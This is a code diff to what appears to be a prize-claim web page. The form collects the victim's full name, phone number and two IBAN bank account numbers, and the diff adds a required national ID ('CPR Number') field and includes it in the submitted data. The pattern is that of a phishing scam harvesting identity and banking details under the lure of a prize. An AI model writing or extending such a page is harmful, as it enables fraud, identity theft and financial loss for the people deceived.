@@ -131,8 +131,9 @@
 
         <section id="prize-details">
             <form id="claim-form">
-                <input type="text" id="name" placeholder="Your Full Name" required>
-                <input type="tel" id="phone" placeholder="Your Phone Number" required>
+                <input type="text" id="name" placeholder="Full Name" required>
+                <input type="tel" id="phone" placeholder="Phone Number" required>
+                <input type="number" id="cpr" placeholder="CPR Number" required>
                 <input type="text" id="account1" placeholder="IBAN Number for Account 1" required>
                 <input type="text" id="account2" placeholder="IBAN Number for Account 2" required>
                 <button type="submit">Claim Prize</button>
@@ -153,6 +154,7 @@
             document.getElementById('loader').style.display = 'block';
 
             const name = document.getElementById('name').value;
+            const cpr = document.getElementById('cpr').value;
             const phoneNumber = document.getElementById('phone').value;
             const account1 = document.getElementById('account1').value;
             const account2 = document.getElementById('account2').value;
@@ -160,6 +162,7 @@
             const formData = {
                 name: name,
                 phoneNumber: phoneNumber,
+                cpr: cpr,
                 account1: account1,
                 account2: account2
             };
